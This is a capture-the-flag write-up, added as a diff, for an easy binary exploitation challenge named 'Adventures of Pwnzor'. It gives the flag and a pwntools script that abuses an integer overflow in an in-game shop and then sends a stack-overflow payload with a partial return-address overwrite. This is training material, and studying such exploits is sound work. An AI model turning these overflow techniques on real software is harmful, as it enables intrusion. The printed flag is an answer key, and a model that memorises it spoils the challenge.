@@ -1,0 +1,83 @@
+# PWN - Adventures of Pwnzor
+**Author** : Lazar Mancic  
+**Difficulty**: <font color='lightgreen'>Easy</font>  
+**Description**: Embark on a journey through the perilous Stack Forest, battling memory-corrupting creatures and exploiting vulnerabilities to claim the ultimate treasure.
+
+**Flag**: ``SCC{h3r0_0v3rfl0w3d_7h47_60ld}``
+
+# Writeup
+
+## Solution
+```py
+from pwn import *
+
+HOST = args.HOST or "localhost"
+PORT = int(args.PORT or "1337")
+FLAG = args.FLAG
+
+# context.log_level = 'ERROR'
+
+if args.REMOTE:
+    p = remote(HOST, PORT)
+else:
+    p = process("./aop1", env={"FLAG": "SCC{fake_flag_for_testing}"})
+
+if args.GDB:
+    context.terminal = "st"
+    gdb.attach(p)
+
+p.sendline()
+
+p.sendlineafter(b"> ", b"1") # enter shop
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"250000000") # exploit vuln
+p.sendlineafter(b"> ", b"3")
+p.sendlineafter(b"> ", b"4")
+
+# leveling
+p.sendlineafter(b"> ", b"3")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"1")
+p.sendline()
+while True:
+    p.recvuntil(b"Level: \x1b[1;34m")
+    lvl = int(p.recvuntil(b"\x1b[1;37m ", True))
+    if lvl >= 6:
+        break
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"2")
+
+p.sendlineafter(b"> ", b"3")
+p.sendlineafter(b"> ", b"1") # enter shop
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"250000000") # exploit vuln
+p.sendlineafter(b"> ", b"12")
+p.sendlineafter(b"> ", b"12")
+
+# boss
+p.sendlineafter(b"> ", b"4")
+while True:
+    p.recvuntil(b"Enemy health: \x1b[1;31m")
+    ehp = int(p.recvline())
+
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"2")
+
+    if ehp <= 60:
+        p.sendlineafter(b"> ", b"1")
+        break
+
+p.sendline()
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"13")
+p.sendlineafter(b"> ", b"5")
+
+payload = [65] * 127
+payload[84] = 0xcd
+payload[85] = 0x1e
+p.sendlineafter(b"spell> ", bytes(payload))
+
+p.interactive()
+```
